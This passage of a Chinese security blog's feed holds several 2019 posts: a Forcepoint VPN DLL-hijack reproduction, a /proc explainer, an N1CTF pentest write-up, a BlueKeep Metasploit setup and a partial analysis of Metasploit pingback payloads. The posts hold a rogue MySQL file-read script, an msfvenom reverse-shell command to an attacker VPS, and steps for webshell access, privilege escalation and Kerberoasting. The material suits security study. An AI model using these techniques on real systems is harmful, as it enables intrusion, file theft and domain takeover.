    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-27 0:03:55<br><img src="/wallpaper/anime.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>群里师傅传了一篇漏洞详情，如下：<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>其中翻到这个的时候：<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/68BEF323-598F-4DF8-80DB-1D6793F8D6B7.png" alt="a80184c994256c62b68309752428a068"></p><p>这不就是白加黑么..还能自启，岂不美哉～</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Forcepoint VPN Windows Client &lt; 6.6.1</p></blockquote><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/0F0DCA0F-6513-4706-99ED-496E97F42D6E.png" alt="b565f7eb7008dae50e9cffef5140d7b0"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/ED60C5CC-3A68-4AD1-8D96-591E1BC1ADBE.png" alt="240c6b110481cf8ad45fadf90f90bd38"></p><p>安装的时候会调用<code>msiexec.exe</code>，使用驱动加载<code>NT/SYSTEM</code></p><p>然后保证自启动，所以只要我们能摸到路径就能持久控制</p><p>打开程序，我们发现他会去查询一些不存在的目录和程序<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/A0273E78-14DF-4D99-9191-69B446967C1A.png" alt="9cb5f6b66d8398fa197331f3ac360091"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/02015B80-4E63-4E3F-9636-B2D3B7BC126A.png" alt="e556b1bc632f8bc055b6631bab814364"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/0900E779-7DB6-4822-B27D-D62C34A17472.png" alt="8c750183f70b3a62663bdfcf5d0b7be2"></p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>看这个就好了<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>暴风哭泣，不会</p><p>（我是一个没有感情的复现机器）</p><h2 id="0x03-免杀"><a href="#0x03-免杀" class="headerlink" title="0x03 免杀"></a>0x03 免杀</h2><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/44A7E077-1986-4B16-A52D-1287E84C837A.png" alt="c722b31e90a0fd3ac2ff973fe6445c7a"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/6DB73CBB-5076-49AE-A1A7-613CF68C0F8A.png" alt="aee18db9dbe77ac4edcca72af7e3d1b9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-27 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/anime.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Forcepoint VPN" scheme="http://patrilic.top/tags/Forcepoint-VPN/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 Linux系统 proc</title>
    <link href="http://patrilic.top/2019/09/11/%E6%B5%85%E8%B0%88%20Linux%E7%B3%BB%E7%BB%9F%20Proc/"/>
    <id>http://patrilic.top/2019/09/11/浅谈 Linux系统 Proc/</id>
    <published>2019-09-10T16:44:23.000Z</published>
    <updated>2019-09-10T16:59:01.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-9-11 0:44:23<br><img src="/wallpaper/thumb-1920-608362.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我们经常在CTF比赛里，或者实际渗透里，使用到<code>/proc</code>这个目录，比如常常利用<code>/proc/self/cwd</code>来访问进程中的文件，使用<code>/proc/self/environ</code>读取系统的环境变量等</p><h2 id="0x01-Proc-到底是个什么东西"><a href="#0x01-Proc-到底是个什么东西" class="headerlink" title="0x01 Proc 到底是个什么东西"></a>0x01 Proc 到底是个什么东西</h2><p>实际上我们在任何的GUN/Linux操作系统里，都能找到这个目录，并且里面存在大量目录<br><img src="/浅谈 Linux系统 Proc.resources/70DE7AC6-D2C4-42A8-8A78-3F631B6515A6.png" alt="f48d8c5a7f26e7be272c7c36a0224e65"><br>但是如果，我们使用 <code>ls -al</code>来查看<br><img src="/浅谈 Linux系统 Proc.resources/F0A39E32-2167-47D3-B6B7-C76BD67C7F3D.png" alt="e39161263565785f4d27eea36ccec527"></p><p>可以看到绝大部分文件大小为0</p><p>但是我们可以使用cat命令获取其中的大量信息<br><img src="/浅谈 Linux系统 Proc.resources/C6AC528D-6694-4F8C-A7D8-DD139C74A308.png" alt="cc6935b581357039fa948356e6cc9ea9"></p><p>为什么0字节还能存有内容呢</p><p>这里提到一个概念：文件系统<br>维基百科-&gt;<a href="https://zh.wikipedia.org/zh-hans/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>而proc在Unix里常常被称为procfs -&gt; proc file system<br>它包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 /proc 目录。由于 /proc 不是一个真正的文件系统，它也就不占用存储空间，只是占用有限的内存。</p><p>维基百科-&gt;<a href="https://zh.wikipedia.org/wiki/Procfs" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>所以说，其实/proc目录更多的是起到一个类似于接口的作用，当我们使用cat命令获取时，它会从内存中获取信息，来返回给用户，而目录中的数字，其实就是PID号。</p><ul><li>/proc/$PID/cmdline  启动进程时执行的命令 </li><li>/proc/$PID/environ  该文件保存进程的环境变量 </li><li>/proc/$PID/cwd  一个符号连接, 指向进程当前的工作目录 </li><li>/proc/$PID/exe  一个符号连接, 指向被执行的二进制代码 </li><li>/proc/$PID/fd  进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接 </li><li>/proc/$PID/attr  进程的属性 </li></ul><h2 id="0x02-proc-self"><a href="#0x02-proc-self" class="headerlink" title="0x02 /proc/self"></a>0x02 /proc/self</h2><p>相对于进程PID，我们在实战的文件读取中，更多使用的是<code>/proc/self</code>目录。<br>在<code>stackexchange</code>有一个讨论，<br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a></p><p>也就是说，其实<code>/proc/self</code> 是指向当前进程的内存</p><p>比如之前护网杯2019的一道利用 MySQL LOAD DATA特性读取文件，让php远程连接到我们的客户端，然后发送命令，由于在远程服务器是使用apache进程来连接，所以我们可以读取到<code>/proc/self/cwd/index.php</code><br><img src="/浅谈 Linux系统 Proc.resources/0627C538-2DED-428D-9E06-F30859D58EE8.png" alt="c6ca5efffe4e45310d735cfbe4e70b8e"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/proc/self/cwd/index.php"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>tip: 当找不到网站路径的时候，可以利用<code>/proc/self/cwd</code>目录来读取apache进程的php文件源码</p><h2 id="0x03-相关链接🔗"><a href="#0x03-相关链接🔗" class="headerlink" title="0x03 相关链接🔗"></a>0x03 相关链接🔗</h2><p><a href="https://blog.csdn.net/goodluckwhh/article/details/17010029" target="_blank" rel="noopener">https://blog.csdn.net/goodluckwhh/article/details/17010029</a><br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a><br><a href="https://www.cnblogs.com/youxin/p/4980058.html" target="_blank" rel="noopener">https://www.cnblogs.com/youxin/p/4980058.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-9-11 0:44:23&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-608362.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="linux" scheme="http://patrilic.top/categories/linux/"/>
    
    
      <category term="proc" scheme="http://patrilic.top/tags/proc/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Pentest N1ctf2019.lab Write-up</title>
    <link href="http://patrilic.top/2019/09/10/N1CTF%20%20Pentest%20N1ctf2019.lab%20Write-up/"/>
    <id>http://patrilic.top/2019/09/10/N1CTF  Pentest N1ctf2019.lab Write-up/</id>
    <published>2019-09-09T17:20:33.000Z</published>
    <updated>2019-09-09T15:03:25.597Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-10 01:20:33<br><img src="/wallpaper/thumb-1920-584470.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>scanf大师傅的题，tql..orz<br>被haya师傅带着做了老半天，才肝出来第一题，然后后面因为太多人搅屎没办法做了..</p><p>现在比赛结束了，趁着师傅还没关环境复盘一下</p><h2 id="0x01-Step-1"><a href="#0x01-Step-1" class="headerlink" title="0x01 Step 1"></a>0x01 Step 1</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8B6AEA77-BC71-4524-AB3E-03682BE9AA2B.png" alt="bfb092323f5fb9388df881f67790c5fa"></p><p>入口ip:<br>简单探测一下端口：47.52.129.242<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F08CCB53-2BEA-45DC-B0DA-4F2BC882EB53.png" alt="dd0b6c61e3921224e34a939bed7af5db"></p><p>发现开了ProFTPD 1.3.5</p><p>稍微googole一下，发现存在任意文件拷贝漏洞（CVE-2019-12815）</p><p>使用ncftp 连接<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0E212818-FD0C-4FF0-A6FC-FB489AA4123A.png" alt="926bccdda31f92e2756d6d79922d0b74"></p><p>其实还是蛮卡的…<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F29833FD-DAE3-44BF-B4D4-D52E08039466.png" alt="13ec778cbd22acd27d61aa2cddf1bf40"></p><p>然后我们把msg文件写入到patrilic.php里</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/26BF5290-F82E-4BF0-83C7-4919069AB43D.png" alt="c33df3cd9728cf93922824154027574a"></p><blockquote><p>PS: 好像Windows连接需要密码，然后TOP1000字典就可以爆破出来，用户ftp 密码 mustang</p></blockquote><p>所以现在我们有一个<code>www-data</code>权限的webshell，先反弹一个shell到我们的vps上</p><p>先查看一下内核版本：<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/675A849D-69D2-4096-86FB-E966A8C08EB9.png" alt="82bb6955321a5530c3bf9a12277d6fb0"></p><p>ok，使用<code>msfvenom</code>生成一个x64的linux reverse_shell木马，放在web目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload  linux/x64/shell_reverse_tcp LHOST=45.xx.xx.xx LPORT=7778 -f elf -o /home/wwwroot/default/test.elf</span><br></pre></td></tr></table></figure><p>我们用file_put_contents + file_get_contents将文件下载到/tmp目录下<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/20EF13D9-B920-4C9F-84FE-FCD4AF273E9E.png" alt="d6ff181f69ac7604fe5c637ac30deb64"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0EF41EEA-CA1B-43E0-871F-38F60DB606F6.png" alt="954843a51658096b9c4c38ff57e7b6fa"></p><p>然后给个执行权限 就可以弹回shell了</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/123A148B-B113-4DD5-AFCB-75FA44314F4F.png" alt="bbf5cad7c673e608440379b7ff6ff091"></p><p>然后给它升级一下，搞成meterpreter session<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/E1D7AACB-FC79-43DA-8B32-CEB073860A57.png" alt="aa30ede9c3f038c1e9cd13dbca800839"></p><p>提权的话，因为给了提示嘛，snap，也能比较容易想到是年初那个漏洞</p><p>CVE-2019-7304<br>github上也有exp:<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">https://github.com/initstring/dirty_sock</a></p><p>然后因为有师傅搅屎..就把snap升级了，导致没提示的时候，很多师傅一脸懵逼<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8C6E7428-C46F-428F-86BA-21E122C7B106.png" alt="e1f33edcc2a556e7ed15a6c1bae0be25"></p><p>不过snap是在18.04的版本之后才会自带，所以在这嫌疑还是比较大的</p><p>我们先用python得到一个半互式shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/19F30D2A-BF2B-4F89-91CB-9CB7DCE38BC9.png" alt="b95386722c3c3a34961c7b8528cc83c4"></p><p>可以看到其实，这个exp会生成一个<code>dirty_sock</code>用户，并且密码就是<code>dirty_sock</code><br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0F9D34D8-20D2-443B-B50D-33EC15E10CF4.png" alt="9f889bd4914086f7264e6899039dd6ec"></p><p>Get the flag: N1CTF{ImpOrtant_P0int3_4de0e}</p><h2 id="0x02-Step-2"><a href="#0x02-Step-2" class="headerlink" title="0x02 Step 2"></a>0x02 Step 2</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/61C9F7F2-E91B-47E0-B3D4-B85F65BBEC53.png" alt="7a4b924e2833d1fcb3650d3014e8dcd4"></p><p>ps获取进程列表<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0B6BE438-DB34-4FA6-AFFC-3A0377150FB8.png" alt="131de33d1136f8bf8d9186506a6e97f0"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/77BB4EC0-21B9-42AD-9EF3-38792F5D2DEC.png" alt="97c856f03e9a74098462c37adcfc9e6f"></p><p>可以看到dev上有一个域用户<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/2481FCC8-41D6-40BA-BC15-7E4AC208D4ED.png" alt="cd1e782d5470e4ef6206fffc7b86bbc6"></p><p>使用meterpreter加载一个powerview.ps1来帮助我们信息搜集</p><p>注意在现在的branch里是没有Get-DomainUser等函数的，使用<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906</a></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/545FAF70-7345-4667-8704-FB4244EBA3D2.png" alt="03048e40dac0352715cfbd422a7a75b6"></p><p>以下省略1000字(就是常规的Get-DomainUser等进行搜集)</p><p>通过信息搜集，我们获取到了存在一个backup Server<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/A6F837F7-5B9D-4222-8D72-6860DE27F023.png" alt="e7ef96141c9817a0d3369e74910e1a32"></p><p>调用<code>Invoke-Kerberoast</code>获取SPN密文<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/4A0FA7B5-A860-4CEA-BF81-7ED94637DF8B.png" alt="99c1cfebd9372ddf839cd407ca4099d9"><br>解密： P@ssword123</p><p>然后后面就是约束委派，提权拿到\backup.n1ctf2019.lab\backupfile\DCServer的访问权限</p><p>里面存有注册表备份，使用impacket套件解密后拿到本地管理员hash</p><p>然后银票据，金票据，拿到DC权限，最后拿到域管理员桌面上的flag</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>因为后面隧道实在是太不稳定了,session疯狂掉,一直在88这台机子上转悠<br>虽然好像就我一个人在弄<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/9359A854-337E-4AB2-BAE2-166F58C570AF.png" alt="91d5a2c55d9806198151c414dd240769"></p><p>vultr真惨啊..</p><p>然后后面的约束委派，实在是不怎么熟悉，还是经验太少..</p><p>最后实名膜一波<code>scanf</code>师傅，以及带我飞的<code>haya</code>师傅，orz</p><p>奉上官方wp：<br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md" target="_blank" rel="noopener">https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md</a></p><p>Nu1L太强了， 也感谢一波scanf师傅带来这么有趣的题目（不过如果没人搅屎的话说不定能肝出来step2 hhhh）</p><p>最后还是觉得，过段时间好好研究一波kerberos～，趁着还在学校hhhh(kekeo都没用过的我 太菜了）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-10 01:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-584470.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="n1ctf-pentest" scheme="http://patrilic.top/tags/n1ctf-pentest/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 RDP 远程代码执行</title>
    <link href="http://patrilic.top/2019/09/09/CVE-2019-0708%20RDP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/09/09/CVE-2019-0708 RDP 远程代码执行/</id>
    <published>2019-09-09T09:03:55.000Z</published>
    <updated>2019-09-09T12:07:38.289Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-09 17:03:55<br><img src="/wallpaper/8.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>RDP服务的漏洞，除了之前的<code>ms12-020</code>(补丁号：<code>KB2621440</code>)，影响最轰动的也就是这次的<code>bluekeep</code>了，hw之前爆出的漏洞，前两天<code>rapid7</code>官方在github上传了最新的exp，可直接利用。</p><p><strong>影响范围</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows 7</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2008</span><br><span class="line"></span><br><span class="line">Windows Server 2003</span><br><span class="line"></span><br><span class="line">Windows XP</span><br></pre></td></tr></table></figure></p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>目前需要替换exp包，我这里使用的是MacOS环境（exp包到处都有，就不放了)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cve_2019_0708_bluekeep_rce.rb 添加到 /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">rdp.rb 替换 /opt/metasploit-framework/embedded/framework/lib/msf/core</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb 替换 /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/dp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb 替换 /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure></p><p>替换完成之后使用<code>reload_all</code>加载模块<br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/6BC0D3A6-C794-4D55-A0DA-DD40C87198D4.png" alt="5bd7750bf0e644937edf8c6a1474e664"></p><p>可以看到存在4个targets，我使用的是VMWare，所以选target 3</p><p><strong>Windows 7 ultimate SP1</strong><br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/FFEE06BD-258D-411F-AA56-C7D79F037E53.png" alt="e147fe734985ded3f8137442b883e5ec"></p><p>但是关掉session后重新打第二次，就蓝屏了<br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/3DFEC667-3E43-47DD-B13E-C09010C459CA.png" alt="2342e02c78bd2677c4bbcc38523587d8"></p><p><strong>Windows Server 2008 R2</strong> ，果然蓝屏了2333<br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/CCAF6F35-964F-47EB-B380-50B4BC89BD17.png" alt="a38d2f7b12e397248a5dfc1cdc8c9d37"></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>听大佬说，核心代码还没放出来，测试过程中发现除了08的不能成功，其他都还ok，（听说需要修改注册表）</p><h2 id="0x03-相关链接🔗"><a href="#0x03-相关链接🔗" class="headerlink" title="0x03 相关链接🔗"></a>0x03 相关链接🔗</h2><p><a href="https://www.freebuf.com/news/203584.html" target="_blank" rel="noopener">https://www.freebuf.com/news/203584.html</a><br><a href="https://www.freebuf.com/vuls/205380.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/205380.html</a><br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-09 17:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/8.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="BlueKeep" scheme="http://patrilic.top/tags/BlueKeep/"/>
    
  </entry>
  
  <entry>
    <title>MSF Pingback Payloads</title>
    <link href="http://patrilic.top/2019/09/06/Payloads/"/>
    <id>http://patrilic.top/2019/09/06/Payloads/</id>
    <published>2019-09-05T16:47:46.000Z</published>
    <updated>2019-09-16T06:42:00.915Z</updated>
    
    <content type="html"><![CDATA[<p><a name="JSO7R"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote><p>文章首发于先知社区，文章链接：<a href="https://xz.aliyun.com/t/6268" target="_blank" rel="noopener">https://xz.aliyun.com/t/6268</a></p></blockquote><p>今天早上Rapid7cn的公众号更新了一篇文章，然后就被群里的大师傅们转发了好几遍233，感觉挺有意思的，也想着分析一下</p><p><a href="https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA</a></p><p>官网： <a href="https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/" target="_blank" rel="noopener">https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/</a><br><a name="mXsId"></a></p><h2 id="0x01-pingback"><a href="#0x01-pingback" class="headerlink" title="0x01 pingback"></a>0x01 pingback</h2><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567694251815-6a249db8-4ac8-4a27-b999-49869d8138d5.png" alt="image.png">这次一共更新了10个pingback payload, 至于什么是pingback，其实msf官方在github已经说的很清楚了<br><a href="https://github.com/rapid7/metasploit-framework/pull/12129" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12129</a></p><blockquote><p>Pingback payloads are designed to provide a limited-functionality payload to verify an exploit has worked. <strong>It does not provide a shell of any kind.</strong> A pingback payload creates a “random” UUID value (separate from the payload UUID) that is written to the Metasploit database along with other data. When executed on target, the payload sends back that UUID to verify that the exploit worked, but nothing else. When Framework receives that UUID, we verify the target is vulnerable to the exploit without loading an interactive shell.<br>This prevents traditional [W/M]ITM attacks or someone sniffing the traffic for information, as the UUID itself means nothing to a listener, and without further execution, the session itself is not particularly valuable to an attacker.</p></blockquote><p>简单来说感觉其实就是，AV对msf之前的常规reverse_shell会进行拦截，导致我们并不能很清楚的知道目标是否存在该漏洞，然后这个payload就完全不会产生交互式shell，而只是返回一个UUID，能让我们知道poc/exp是否执行成功，然后目标是否存在当前漏洞，而不必担心被中间人攻击或者被拦截</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567696662682-c96fa1cc-966d-4b06-b19e-2d52f8884ed3.png" alt="image.png"></p><h2 id="0x02-How-to-Use"><a href="#0x02-How-to-Use" class="headerlink" title="0x02 How to Use"></a>0x02 How to Use</h2><p>翻看代码，我们发现它其实是每次生成一个新的UUID，然后将其发送到目标中，然后调用listener中的payload设置一个监听，然后当程序进行 <code>Pingback</code> 时，MSF打开一个会话来接受UUID，最后拿到完整UUID后，就关闭当前session</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/modules/payloads/singles/ruby/pingback_reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruby_string</span></span></span><br><span class="line">    <span class="keyword">self</span>.pingback_uuid <span class="params">||</span>= <span class="keyword">self</span>.generate_pingback_uuid</span><br><span class="line">    lhost = datastore[<span class="string">'LHOST'</span>]</span><br><span class="line">    lhost = <span class="string">"[<span class="subst">#&#123;lhost&#125;</span>]"</span> <span class="keyword">if</span> Rex::Socket.is_ipv6?(lhost)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"require'socket';"</span> \</span><br><span class="line">      <span class="string">"c=TCPSocket.new'<span class="subst">#&#123;lhost&#125;</span>',<span class="subst">#&#123;datastore[<span class="string">'LPORT'</span>].to_i&#125;</span>;"</span> \</span><br><span class="line">      <span class="string">"c.puts'<span class="subst">#&#123;[[<span class="keyword">self</span>.pingback_uuid].pack(<span class="string">'H*'</span>)].pack(<span 